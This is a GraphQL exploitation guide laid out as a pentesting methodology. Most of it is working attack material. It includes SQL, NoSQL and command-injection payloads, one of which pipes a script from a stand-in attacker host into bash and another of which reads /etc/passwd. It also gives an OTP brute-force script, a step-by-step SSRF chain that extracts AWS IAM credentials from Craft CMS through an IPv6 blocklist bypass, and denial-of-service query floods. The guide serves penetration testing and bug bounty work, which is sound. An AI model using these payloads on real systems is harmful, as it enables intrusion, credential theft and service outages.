# GraphQL Deep Dive: Complete Exploitation Methodologies

---

## Table of Contents
- [Part 1: Reconnaissance & Discovery](#part-1-reconnaissance--discovery)
- [Part 2: Authentication & Authorization Bypass](#part-2-authentication--authorization-bypass)
- [Part 3: Injection Attacks](#part-3-injection-attacks)
- [Part 4: Batching Attacks](#part-4-batching-attacks)
- [Part 5: Denial of Service](#part-5-denial-of-service)
- [Part 6: SSRF via GraphQL](#part-6-ssrf-via-graphql)
- [Part 7: Subscriptions & WebSocket Attacks](#part-7-subscriptions--websocket-attacks)
- [Part 8: Complete Testing Checklist](#part-8-complete-testing-checklist)

---

## Part 1: Reconnaissance & Discovery

### 1.1 Finding GraphQL Endpoints

GraphQL endpoints are often exposed under predictable paths. Here's how to find them systematically.

**Common Endpoint Paths to Test:**
```
/graphql
/graphql/console
/graphql/api
/graphiql
/graphiql.php
/playground
/altair
/query
/gql
/v1/graphql
/api/graphql
/subscriptions
```

**Method 1: JavaScript File Analysis**
Many modern applications bundle GraphQL endpoint references in their JavaScript files. Use browser DevTools or command-line tools to search for patterns:
```bash
# Download all JS files and search for GraphQL patterns
curl -s https://target.com | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
  curl -s "https://target.com/$js" | grep -iE 'graphql|query|mutation|apollo'
done

# Search for endpoint patterns in JS
grep -rE '"/graphql"|"/query"|graphql\.php' /path/to/js/files/
```

**Method 2: Automated Discovery with Nuclei**
```bash
nuclei -u https://target.com -t graphql-detect.yaml
```

**Method 3: Wayback Machine & Archive Scans**
```bash
# Find historical GraphQL endpoints
curl "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=json" | grep -i graphql
```

### 1.2 Introspection Queries (When Enabled)

Introspection is GraphQL's self-documentation feature. When enabled, it reveals the entire API schema.

**Simple Test for Introspection:**
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } } }"}'
```

If introspection is enabled, you'll receive schema information. If disabled, you'll typically see an error like `"Introspection is not allowed"` .

**Complete Schema Dump Query:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

### 1.3 Bypassing Introspection Restrictions

When introspection is disabled, try these techniques:

**Technique 1: Field Suggestion Abuse**
GraphQL's field suggestion feature can reveal schema information even when introspection is disabled. Send an invalid query and examine error messages :
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { asdfasdf } }"}'
```
The response may contain helpful suggestions like `"Did you mean 'id', 'name', 'email'?"`

**Technique 2: __type Queries**
Sometimes `__schema` is blocked but `__type` is not:
```bash
curl -X POST https://target.com/graphql \
  -d '{"query":"{ __type(name: \"User\") { fields { name } } }"}'
```

**Technique 3: GET Request Introspection**
Some servers only block introspection on POST requests:
```bash
curl "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"
```

**Technique 4: Clairvoyance Tool**
When introspection is completely disabled, use Clairvoyance to recover the schema through brute-force field discovery :
```bash
python -m clairvoyance -o schema.json https://target.com/graphql
```

### 1.4 Tools for Reconnaissance

| Tool | Purpose | Installation/Usage |
|------|---------|-------------------|
| **GraphQL Voyager** | Visualize schema interactively | `npx graphql-voyager --endpoint https://target.com/graphql`  |
| **InQL Scanner** | Burp extension for schema analysis | Install from BApp Store or `pip install inql`  |
| **graphw00f** | Fingerprint GraphQL implementation | `python main.py -d -t https://target.com/graphql` |
| **Metasploit Module** | Automated introspection scanning | `use auxiliary/scanner/http/graphql_introspection_scanner`  |
| **GQLMap** | Automated endpoint discovery and testing | `python gqlmap.py https://target.com --crawl --introspect`  |

### 1.5 Using Burp Suite for GraphQL Testing

**Setting Up Burp Suite :**
1. Configure Burp as a proxy (listening on 127.0.0.1:8080)
2. Install the InQL extension from BApp Store
3. Configure your browser to use the Burp proxy
4. Navigate to the target application

**InQL Scanner Features :**
- Automatic GraphQL endpoint discovery
- Introspection query execution
- Query template generation for all discovered types
- Direct integration with Burp Repeater

**Using InQL from Command Line :**
```bash
# Generate query templates from a schema
inql -t https://target.com/graphql --generate-queries --generate-html -o ./output

# Use with a schema file
inql -f schema.json --generate-queries --generate-html
```

---

## Part 2: Authentication & Authorization Bypass

### 2.1 Insecure Direct Object Reference (IDOR)

IDOR occurs when an attacker can access another user's data by modifying an identifier parameter.

**Real-World Exploitation Steps:**

**Step 1: Identify an object query**
Using introspection, find queries that accept ID parameters:
```graphql
query {
  user(id: "1") {
    id
    name
    email
  }
}
```

**Step 2: Test for IDOR**
Modify the ID value and observe if you receive another user's data :
```graphql
query {
  user(id: "2") {
    id
    name
    email
  }
}
```

**Step 3: Use Batching to Enumerate Many IDs**
```graphql
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  u4: user(id: "4") { email }
  # ... continue
}
```

**Real-World Example:**
In a typical bug bounty scenario, a hacker might find a `currentUser` query that accepts an `internalId` parameter. Changing this ID reveals other users' data, indicating an IDOR vulnerability .

### 2.2 Field-Level Authorization Bypass

Sometimes authorization is only checked at the root level, allowing attackers to request sensitive nested fields.

**Testing for Over-Fetching Vulnerabilities:**
```graphql
query {
  listPosts(postId: 13) {
    title
    description
    # Try adding unexpected fields
    user {
      username
      email
      password
      resetToken
    }
  }
}
```

If the query returns data for fields you shouldn't have access to, this is a vulnerability .

### 2.3 Mass Assignment in Mutations

Mass assignment occurs when a mutation accepts more fields than intended, allowing privilege escalation.

**Exploitation Steps :**

**Step 1: Find a user creation mutation**
```graphql
mutation {
  registerAccount(
    nickname: "attacker", 
    email: "attacker@example.com", 
    password: "password123"
  ) {
    token {
      accessToken
    }
    user {
      email
      nickname
      role
    }
  }
}
```

**Step 2: Add the role field to the mutation**
```graphql
mutation {
  registerAccount(
    nickname: "attacker", 
    email: "attacker@example.com", 
    password: "password123", 
    role: "Admin"
  ) {
    token {
      accessToken
    }
    user {
      email
      nickname
      role
    }
  }
}
```

If the response shows `role: "Admin"`, you've successfully exploited mass assignment.

### 2.4 Authentication Bypass via Headers

**Real-World Vulnerability (CVE-2024-57190 - Erxes):**
An improper access control vulnerability allowed attackers to bypass authentication by manipulating the HTTP "User" header. This enabled unauthorized access to any GraphQL endpoint without valid credentials (CVSS 9.8 Critical).

**Testing Approach:**
1. Intercept a GraphQL request
2. Modify or remove authentication headers
3. Test custom headers like `X-User`, `X-User-ID`, `User`
4. Observe if the request is still processed

### 2.5 Token Scope Bypass

**Testing Methodology with graphql-authz-fuzzer:**
```bash
# Test what operations a read-only token can perform
gql-authz-fuzz https://target.com/api/graphql --token <read_only_token>

# The tool classifies responses:
# - SCOPE_BLOCKED: Token scope properly rejected the operation (good)
# - SUCCESS: Mutation executed with restricted token (critical finding)
# - RESOLVER_DENIED: Auth passed but resolver denied
```

**Real-World Vulnerability (CVE-2025-11340 - GitLab):**
GitLab `read_api` tokens could invoke write mutations on vulnerability records because scope was not enforced at the GraphQL layer. The key insight: if a read-only token gets "resource not found" instead of "scope insufficient", the resolver ran - meaning scope enforcement is missing.

---

## Part 3: Injection Attacks

### 3.1 SQL Injection

GraphQL's type system validates data format (e.g., String), not content. A legitimate-looking string can contain malicious SQL.

**Testing for SQL Injection:**

**Step 1: Identify user input points**
Look for queries with string arguments:
```graphql
query {
  user(name: "admin") {
    id
    email
  }
}
```

**Step 2: Test with SQL injection payloads**
```graphql
# Boolean-based
query {
  user(name: "admin' OR '1'='1") {
    id
    email
  }
}

# Union-based
query {
  user(name: "' UNION SELECT username, password FROM users--") {
    id
    email
  }
}

# Time-based
query {
  user(id: "1' AND (SELECT pg_sleep(5))--") {
    id
  }
}
```

**Step 3: Analyze error messages**
Error messages often reveal database type and structure. Look for:
- PostgreSQL: `PG::SyntaxError`
- MySQL: `You have an error in your SQL syntax`
- SQL Server: `Unclosed quotation mark`

**Automated Testing with Burp Intruder:**
1. Send the GraphQL request to Intruder
2. Set payload position on the argument value
3. Use SQL injection payload list
4. Analyze response differences

### 3.2 NoSQL Injection

**Testing for NoSQL Injection in MongoDB backends:**

**Step 1: Test with $gt operator**
```graphql
query {
  user(name: "{\"$gt\": \"\"}") {
    id
    email
  }
}
```

**Step 2: Extract all data with regex**
```graphql
query {
  users(filter: { name_regex: ".*" }) {
    id
    email
    password
  }
}
```

**Step 3: JavaScript execution via $where**
```graphql
query {
  usersNoSQL(filter: "this.username == 'admin'") {
    id
    username
    password
  }
}
```

### 3.3 OS Command Injection

**Testing for Command Injection:**
Look for mutations that perform system operations like file conversion, report generation, or data export.

```graphql
# Test with command separators
mutation {
  exportData(format: "csv; cat /etc/passwd") {
    url
  }
}

mutation {
  generateReport(type: "pdf`whoami`") {
    status
  }
}

mutation {
  convertImage(format: "png; curl http://attacker.com/shell.sh | bash") {
    url
  }
}
```

### 3.4 Using GQLMap for Injection Testing

GQLMap is an automated GraphQL penetration testing tool that supports injection fuzzing .

```bash
# Install GQLMap
git clone https://github.com/nknaman5121a/GQLMap-
cd GQLMap
pip install -r requirements.txt

# Run injection tests
python gqlmap.py https://target.com --inject

# With authentication token
python gqlmap.py https://target.com --token eyJhbGciOiJIUzI1NiIs... --inject

# Custom endpoint
python gqlmap.py https://target.com --endpoint /api/graphql --inject --threads 10
```

---

## Part 4: Batching Attacks

### 4.1 What is Batching?

Batching allows multiple GraphQL operations to be sent in a single HTTP request. This feature can be abused to bypass rate limiting and perform brute-force attacks .

### 4.2 Array-Based Batching

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password1\") { token } }"},
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password2\") { token } }"},
    {"query":"mutation { login(email:\"admin@example.com\", password:\"password3\") { token } }"}
  ]'
```

### 4.3 Alias-Based Batching

```graphql
mutation {
  a1: login(email: "admin@example.com", password: "password1") { token }
  a2: login(email: "admin@example.com", password: "password2") { token }
  a3: login(email: "admin@example.com", password: "password3") { token }
}
```

### 4.4 OTP Brute Force via Batching

Two-factor authentication codes are typically 6 digits (1,000,000 possibilities). With batching, an attacker can test many codes in a single request .

**Exploitation Script:**
```python
import requests
import json

def brute_force_otp(endpoint, email, batch_size=100):
    for start in range(0, 1000000, batch_size):
        batch = []
        for i in range(batch_size):
            otp = str(start + i).zfill(6)
            batch.append({
                "query": f"mutation {{ v{i}: verifyOTP(email: \"{email}\", code: \"{otp}\") {{ success token }} }}"
            })
        
        response = requests.post(endpoint, json=batch)
        data = response.json()
        
        # Check each response for success
        for key, value in data.get('data', {}).items():
            if value.get('success'):
                print(f"OTP found: {key}")
                return
    
    print("OTP not found in range")

# Usage
brute_force_otp("https://target.com/graphql", "victim@example.com")
```

### 4.5 Using CrackQL for Automated Batching Attacks

CrackQL is a tool specifically designed for brute-force attacks using GraphQL batching .

```bash
# Basic usage
python CrackQL.py -t https://target.com/graphql \
  -q "mutation { login(email: \"VARIABLE\", password: \"PASSWORD\") { token } }" \
  -i emails.txt -p passwords.txt

# With custom headers
python CrackQL.py -t https://target.com/graphql \
  -q "mutation { login(email: \"VARIABLE\", password: \"PASSWORD\") { token } }" \
  -i emails.txt -p passwords.txt \
  -H "Authorization: Bearer token123"
```

---

## Part 5: Denial of Service

### 5.1 Recursive Query Attack

When the schema contains circular relationships, deeply nested queries can cause exponential resource consumption.

```graphql
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### 5.2 Field Duplication Attack

**Real-World Vulnerability (CVE-2024-39895 - Directus):**
A denial of service vulnerability existed where an attacker could duplicate fields many times in a single GraphQL query, causing the server to perform redundant computations and consume excessive resources.

```graphql
query {
  users {
    name name name name name name name name name name
    email email email email email email email email email email
    id id id id id id id id id id
  }
}
```

### 5.3 Batch Query DoS

```bash
# Generate 10,000 identical queries
python3 -c "import json; print(json.dumps([{'query':'{ users { name } }'}]*10000))" | \
  curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d @-
```

### 5.4 Query Depth Attack

```graphql
query {
  level1 {
    level2 {
      level3 {
        level4 {
          level5 {
            level6 {
              level7 {
                level8 {
                  level9 {
                    level10 {
                      value
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## Part 6: SSRF via GraphQL

### 6.1 Basic SSRF Testing

Look for mutations or queries that accept URLs for importing, fetching, or webhook functionality.

```graphql
# Test with internal addresses
mutation {
  importUrl(url: "http://169.254.169.254/latest/meta-data/") {
    content
  }
}

# Test with localhost
mutation {
  fetchUrl(url: "http://localhost:8080/admin") {
    response
  }
}

# Test with file protocol
mutation {
  importUrl(url: "file:///etc/passwd") {
    content
  }
}
```

### 6.2 Real-World SSRF: Craft CMS CVE-2025-68437

**Vulnerability Details:**
An SSRF vulnerability existed in Craft CMS's GraphQL asset upload mutation via the `_file` URL parameter. Attackers could exploit this to make requests to internal services.

**Exploitation Steps :**

**Step 1: Verify the endpoint accepts URL-based asset uploads**
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { save_photos_Asset(_file: { url: \"http://example.com/test.txt\", filename: \"test.txt\" }) { id } }"
  }'
```

**Step 2: Test for SSRF to AWS Metadata**
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { save_photos_Asset(_file: { url: \"http://169.254.169.254/latest/meta-data/\", filename: \"metadata.txt\" }) { id } }"
  }'
```

**Step 3: IPv6 SSRF Bypass (CVE-2026-32594 Bypass)**
The fix for CVE-2025-68437 used `gethostbyname()` which only resolves IPv4 addresses. When a hostname has only AAAA (IPv6) records, the function returns the hostname string itself, causing the blocklist comparison to fail .

**Bypass Payloads for Cloud Metadata :**

| Cloud Provider | Blocked IPv4 | IPv6 Equivalent | Bypass Payload |
|----------------|--------------|-----------------|----------------|
| AWS EC2 IMDS | 169.254.169.254 | fd00:ec2::254 | `http://fd00-ec2--254.sslip.io/latest/meta-data/` |
| Google Cloud | 169.254.169.254 | fd20:ce::254 | `http://fd20-ce--254.sslip.io/` |
| IPv6 Loopback | ::1 | N/A | `http://0-0-0-0-0-0-0-1.sslip.io/` |

**Complete Exploitation Chain for Craft CMS :**
```bash
# Step 1: Enumerate IAM role name
curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/\", filename: \"role.txt\" }) { id } }"
  }'

# Step 2: Retrieve credentials using discovered role name
curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/ROLE_NAME\", filename: \"creds.json\" }) { id } }"
  }'

# Step 3: Access saved credentials from asset volume
```

### 6.3 Using SSRF to Access Internal Services

```graphql
# Access internal Docker API
mutation {
  fetchUrl(url: "http://127.0.0.1:2375/containers/json") {
    response
  }
}

# Access Kubernetes etcd
mutation {
  getUrl(url: "http://127.0.0.1:2379/v2/keys/?recursive=true") {
    data
  }
}

# Access internal Redis
mutation {
  importUrl(url: "http://internal-redis:6379/INFO") {
    content
  }
}
```

---

## Part 7: Subscriptions & WebSocket Attacks

### 7.1 Understanding GraphQL Subscriptions

GraphQL subscriptions use WebSockets for real-time communication. These endpoints often have different security controls than the main GraphQL endpoint.

### 7.2 Testing WebSocket Authorization

**Real-World Case Study: Ostorlab AI Pentest Discovery **

The AI Pentest Engine discovered a critical Broken Function-Level Authorization (BFLA) vulnerability in a GraphQL WebSocket endpoint.

**Step 1: Test Unauthenticated Connection**
```javascript
const WebSocket = require('ws');

const ws = new WebSocket('wss://target.com/subscriptions', 'graphql-transport-ws');

ws.on('open', () => {
  // Send connection_init with empty payload (no credentials)
  ws.send(JSON.stringify({
    type: 'connection_init',
    payload: {}
  }));
});

// If server responds with {"type":"connection_ack"}, authentication is not required at connection phase
```

**Step 2: Perform Introspection Over WebSocket**
```javascript
ws.send(JSON.stringify({
  id: '1',
  type: 'subscribe',
  payload: {
    query: `query {
      __schema {
        subscriptionType {
          name
          fields { name }
        }
      }
    }`
  }
}));
```

**Step 3: Test Individual Subscriptions**
```javascript
// Test each discovered subscription
ws.send(JSON.stringify({
  id: '2',
  type: 'subscribe',
  payload: {
    query: `subscription($data: InputType!) {
      vulnerableSubscription(data: $data) {
        field1
        field2
      }
    }`,
    variables: { data: { testValue: "hello" } }
  }
}));
```

**Step 4: Verify Data Exposure**
If the subscription returns actual data (not just `__typename`), you've confirmed a BFLA vulnerability.

### 7.3 Key Findings from Real-World WebSocket Testing 

The Ostorlab AI engine discovered:
1. **Unauthenticated handshake accepted** - Server did not require authentication at connection phase
2. **Unauthenticated introspection allowed** - Complete subscription schema was accessible
3. **Inconsistent authorization** - Some subscriptions had auth, others didn't
4. **Actual data leakage** - The vulnerable subscription returned real user data

### 7.4 WebSocket Attack Script Template

```javascript
const WebSocket = require('ws');

class GraphQLWebSocketTester {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this.requestId = 0;
  }

  connect(headers = {}) {
    return new Promise((resolve, reject) => {
      this.ws = new WebSocket(this.url, 'graphql-transport-ws');
      
      this.ws.on('open', () => {
        // Send connection_init
        this.ws.send(JSON.stringify({
          type: 'connection_init',
          payload: { headers }
        }));
        resolve();
      });
      
      this.ws.on('error', reject);
    });
  }

  async introspect() {
    return new Promise((resolve) => {
      const id = String(this.requestId++);
      
      const handler = (data) => {
        const message = JSON.parse(data.toString());
        if (message.id === id && message.type === 'next') {
          this.ws.removeListener('message', handler);
          resolve(message.payload.data);
        }
      };
      
      this.ws.on('message', handler);
      
      this.ws.send(JSON.stringify({
        id: id,
        type: 'subscribe',
        payload: {
          query: `query {
            __schema {
              subscriptionType {
                name
                fields { name }
              }
            }
          }`
        }
      }));
    });
  }

  async testSubscription(subscriptionName, variables = {}) {
    return new Promise((resolve) => {
      const id = String(this.requestId++);
      const results = [];
      
      const handler = (data) => {
        const message = JSON.parse(data.toString());
        if (message.id === id) {
          if (message.type === 'next') {
            results.push(message.payload.data);
          } else if (message.type === 'complete') {
            this.ws.removeListener('message', handler);
            resolve(results);
          }
        }
      };
      
      this.ws.on('message', handler);
      
      this.ws.send(JSON.stringify({
        id: id,
        type: 'subscribe',
        payload: {
          query: `subscription($data: InputType!) {
            ${subscriptionName}(data: $data) {
              __typename
            }
          }`,
          variables
        }
      }));
    });
  }

  close() {
    if (this.ws) this.ws.close();
  }
}

// Usage
async function test() {
  const tester = new GraphQLWebSocketTester('wss://target.com/subscriptions');
  await tester.connect(); // Try with empty headers first
  
  const schema = await tester.introspect();
  console.log('Discovered subscriptions:', schema);
  
  // Test each subscription
  for (const field of schema.__schema.subscriptionType.fields) {
    console.log(`Testing ${field.name}...`);
    const result = await tester.testSubscription(field.name, {});
    console.log(`Result:`, result);
  }
  
  tester.close();
}

test();
```

---

## Part 8: Complete Testing Checklist

### 8.1 Reconnaissance Phase

```markdown
[ ] Discover GraphQL endpoints (common paths, JS search)
[ ] Test introspection with POST and GET methods
[ ] Test __type queries if __schema is blocked
[ ] Use field suggestion technique for schema discovery
[ ] Fingerprint GraphQL implementation (graphw00f)
[ ] Save complete schema for offline analysis
[ ] Identify sensitive fields (password, token, creditCard, ssn)
```

### 8.2 Authentication Testing

```markdown
[ ] Test unauthenticated access to endpoints
[ ] Test IDOR by modifying object IDs
[ ] Test batch IDOR enumeration
[ ] Test field-level authorization (request nested sensitive fields)
[ ] Test mass assignment in mutations
[ ] Test token scope enforcement (read token on write operations)
[ ] Test custom header authentication bypass
[ ] Test WebSocket authentication requirements
```

### 8.3 Injection Testing

```markdown
[ ] SQL injection in string arguments
[ ] SQL injection in filter/where clauses
[ ] Time-based blind SQL injection
[ ] NoSQL injection ($gt, $regex, $where operators)
[ ] Command injection in system operations
[ ] SSRF in URL fields (IPv4 and IPv6 addresses)
[ ] File protocol SSRF (file:///etc/passwd)
```

### 8.4 Batching Attack Testing

```markdown
[ ] Test array-based batching limits
[ ] Test alias-based batching
[ ] Test credential brute force via batching
[ ] Test OTP brute force via batching
[ ] Test rate limiting bypass via batching
```

### 8.5 Denial of Service Testing

```markdown
[ ] Test recursive/circular queries
[ ] Test field duplication (100+ times)
[ ] Test batch size limits (1000+ operations)
[ ] Test query depth (20+ levels)
[ ] Test alias count (100+ aliases)
```

### 8.6 WebSocket Testing

```markdown
[ ] Test unauthenticated WebSocket connection
[ ] Test introspection over WebSocket
[ ] Test subscription authorization per operation
[ ] Test for inconsistent authorization between operations
[ ] Test for data leakage through subscriptions
```

### 8.7 Tools Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **Nuclei** | Endpoint discovery | `nuclei -u target.com -t graphql-detect.yaml` |
| **InQL** | Schema analysis | `inql -t https://target.com/graphql` |
| **GQLMap** | Automated testing | `python gqlmap.py https://target.com --crawl --introspect --inject` |
| **CrackQL** | Batching brute force | `python CrackQL.py -t target.com -q "mutation {...}"` |
| **Clairvoyance** | Schema recovery | `python -m clairvoyance -o schema.json target.com` |
| **graphw00f** | Fingerprinting | `python main.py -d -t target.com/graphql` |
| **Metasploit** | Introspection scan | `use auxiliary/scanner/http/graphql_introspection_scanner` |

---

## Summary

GraphQL security testing requires a systematic approach that leverages the unique features of the GraphQL protocol. Key takeaways:

1. **Introspection is your best friend** - When enabled, it provides complete API documentation
2. **Batching bypasses rate limits** - Use aliases to perform brute force in single requests
3. **Field suggestions leak information** - Even when introspection is disabled
4. **WebSockets often have weaker security** - Test subscription endpoints separately
5. **Real-world CVEs show common patterns** - SSRF via URL fields, DoS via field duplication, and BFLA via WebSockets

Always ensure you have proper authorization before testing any GraphQL endpoint. Use the methodologies and tools described here responsibly within the scope of authorized penetration testing or bug bounty programs.
